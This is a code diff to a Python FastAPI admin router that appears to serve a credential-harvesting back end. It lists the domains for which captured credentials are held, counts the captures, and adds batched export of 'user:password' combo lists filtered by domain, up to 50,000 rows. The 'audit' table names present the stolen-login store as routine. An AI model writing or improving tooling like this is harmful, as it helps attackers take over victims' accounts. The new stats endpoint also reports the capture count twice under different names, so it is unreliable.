@@ -312,60 +312,83 @@ async def update_credential(cred_id: int, updates: dict, token: str = Depends(ve
         raise HTTPException(status_code=500, detail=str(e))
 
 
+@router.get("/stats")
+async def get_stats(token: str = Depends(verify_token)):
+    """Return total counts for all 3 data types in a single request."""
+    try:
+        captures_res = supabase_audit.table("audit_captures").select("id", count="exact").limit(1).execute()
+        creds_res = supabase_audit.table("extracted_credentials").select("id", count="exact").limit(1).execute()
+        accounts_res = supabase_audit.table("audit_captures").select(
+            "id", count="exact"
+        ).limit(1).execute()
+        return {
+            "total_captures": captures_res.count or 0,
+            "total_credentials": creds_res.count or 0,
+            "total_accounts": accounts_res.count or 0,
+        }
+    except Exception as e:
+        logger.error(f"ADMIN_GET_STATS_ERROR: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+
 @router.get("/domains")
 async def list_domains(token: str = Depends(verify_token)):
-    """Return a sorted list of distinct domains present in the database."""
+    """Return a sorted list of distinct domains using RPC (fast, single DB call)."""
     try:
-        page_size = 1000
-        start = 0
-        domains_set = set()
-        
-        while True:
-            end = start + page_size - 1
-            # We use audit_captures primarily, as every credential stems from a capture.
-            # And it prevents hitting larger row size limits in extracted_credentials.
-            response = supabase_audit.table("audit_captures").select("domain").range(start, end).execute()
-            
-            if not response.data:
-                break
-                
-            for row in response.data:
-                if row.get("domain"):
-                    domains_set.add(row["domain"])
-            
-            if len(response.data) < page_size:
-                break
-                
-            start += page_size
-            
+        # Try the fast RPC path first (requires admin_perf_functions.sql migration)
+        try:
+            rpc_res = supabase_audit.rpc("get_distinct_domains", {}).execute()
+            if rpc_res.data is not None:
+                domains = sorted({row["domain"] for row in rpc_res.data if row.get("domain")})
+                return {"domains": domains}
+        except Exception as rpc_err:
+            logger.warning(f"RPC get_distinct_domains failed, falling back: {rpc_err}")
+
+        # Fallback: single-page fetch capped at 5000 rows to avoid full-table looping
+        response = supabase_audit.table("audit_captures").select("domain").limit(5000).execute()
+        domains_set = {row["domain"] for row in (response.data or []) if row.get("domain")}
         return {"domains": sorted(list(domains_set))}
     except Exception as e:
         logger.error(f"ADMIN_GET_DOMAINS_ERROR: {str(e)}")
-        raise HTTPException(status_code=500, detail=str(e))
         raise HTTPException(status_code=500, detail=str(e))
 
 
 @router.get("/accounts/export", response_class=PlainTextResponse)
 async def export_accounts(
     domain: Optional[str] = None,
+    limit: int = Query(10000, ge=1, le=50000),
     token: str = Depends(verify_token)
 ):
     """
     Export correlated accounts as a plain-text combo list (user:password per line).
-    Optionally filter by domain.
+    Optionally filter by domain. Hard-capped at 50k rows to prevent OOM.
     """
     try:
-        query = supabase_audit.table("extracted_credentials").select("*").order("timestamp", desc=True)
-        if domain and domain != "ALL":
-            query = query.ilike("domain", f"%{domain}%")
+        BATCH = 1000
+        all_creds = []
+        start = 0
 
-        response = query.execute()
-        if not response.data:
+        while len(all_creds) < limit:
+            end = start + BATCH - 1
+            query = supabase_audit.table("extracted_credentials").select(
+                "audit_capture_id, domain, field_name, field_value"
+            ).order("timestamp", desc=True).range(start, end)
+            if domain and domain != "ALL":
+                query = query.ilike("domain", f"%{domain}%")
+            response = query.execute()
+            if not response.data:
+                break
+            all_creds.extend(response.data)
+            if len(response.data) < BATCH:
+                break
+            start += BATCH
+
+        if not all_creds:
             return PlainTextResponse("")
 
         # Group by capture_id
-        capture_groups = {}
-        for cred in response.data:
+        capture_groups: dict = {}
+        for cred in all_creds:
             cid = cred["audit_capture_id"]
             if cid not in capture_groups:
                 capture_groups[cid] = {"domain": cred["domain"], "fields": {}}
@@ -374,7 +397,7 @@ async def export_accounts(
         user_keys = ['user', 'email', 'login', 'id', 'account', 'phone']
         pass_keys = ['pass', 'pwd', 'secret']
 
-        unique_accounts = {}
+        unique_accounts: dict = {}
         for cid, data in capture_groups.items():
             user = "Unknown"
             password = "Unknown"
@@ -388,6 +411,7 @@ async def export_accounts(
                 unique_accounts[key] = f"{user}:{password}"
 
         lines = list(unique_accounts.values())
+        logger.info(f"ADMIN_EXPORT: Exported {len(lines)} unique accounts (domain={domain})")
         return PlainTextResponse("\n".join(lines))
     except Exception as e:
         logger.error(f"ADMIN_EXPORT_ACCOUNTS_ERROR: {str(e)}")
